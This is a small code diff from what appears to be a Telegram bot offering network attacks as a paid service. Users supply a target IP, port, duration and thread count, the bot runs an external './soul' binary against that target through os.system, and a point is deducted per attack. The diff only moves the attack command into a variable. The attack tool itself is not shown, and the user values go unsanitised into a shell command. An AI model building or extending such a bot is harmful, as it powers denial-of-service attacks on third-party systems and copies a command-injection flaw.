@@ -129,8 +129,9 @@ def handle_attack_command(message):
         attack_in_progress = True
         bot.send_message(message.chat.id, f"🚀 Attack in process!\nTarget IP: {target_ip}\nTarget Port: {target_port}\nDuration: {duration} seconds with {threads} threads.")
 
-        # Simulating the attack command (you should replace this with your actual attack logic)
-        os.system(f"./soul {target_ip} {target_port} {duration} {threads}")
+        # Execute the attack using the `./soul` command (similar to second file)
+        attack_command = f"./soul {target_ip} {target_port} {duration} {threads}"
+        os.system(attack_command)
 
         # Decrease points after attack completion
         user_points[user_id] -= 1
